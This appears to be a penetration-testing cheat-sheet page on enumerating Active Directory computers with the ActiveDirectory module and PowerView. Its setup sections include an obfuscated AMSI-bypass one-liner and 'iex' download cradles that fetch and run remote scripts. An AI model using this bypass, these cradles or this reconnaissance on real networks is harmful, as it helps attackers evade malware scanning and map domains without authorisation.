---
title: "Domain Computers"
description: "Enumerating domain computers."
lead: "Enumerating information about domain computers using the ActiveDirectory PowerShell module and PowerView."
date: 2021-11-07T18:02:53+01:00
lastmod: 2021-11-07T18:02:53+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 20
toc: true
---

## ActiveDirectory Module

### Setup

```powershell
# If computer has internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# If computer has no internet access, download repository
Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1

# Check if module has been imported correctly
Get-Command -Module ActiveDirectory
```

### Get List of Computers in current Domain

```powershell
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter * | Select Name
```

### Information about Operating Systems

```powershell
Get-ADComputer -Filter 'OperatingSystem -Like "*Server 2016"' -Properties OperatingSystem | Select Name,OperatingSystem
```

### Check for Live Hosts (depends on ICMP)

```powershell
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
```

## PowerView

### Setup

```powershell
# If it gets blocked by AMSI we can bypass it with
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Then load the module
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# With internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
```

### Get List of Computers in current Domain

```powershell
Get-NetComputer
Get-NetComputer -FullData
```

### Check for live Hosts (depends on ICMP)

```powershell
Get-NetComputer -Ping
```

### Information about Operating Systems

```powershell
Get-NetComputer -OperatingSystem "*Server 2016"
Get-NetComputer -FullData | select dnshostname,operatingsystem
```

### Get list of sessions on Computer

```powershell
Get-NetSession -ComputerName "dc01.lab.local"
```

### Find any Computers with Constrained Delegation set

```powershell
Get-DomainComputer -TrustedToAuth
```

### Find all Servers that allow Unconstrained Delegation

```powershell
Get-DomainComputer -Unconstrained
```

### Return the local Groups of a remote Server

```powershell
Get-NetLocalGroup SERVER.domain.local
```

### Return the local Group Members of a remote Server using Win32 API Methods (faster but less info)

```powershell
Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local
```

### Enumerates Computers in the current Domain with 'outlier' Properties

```powershell
Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
```
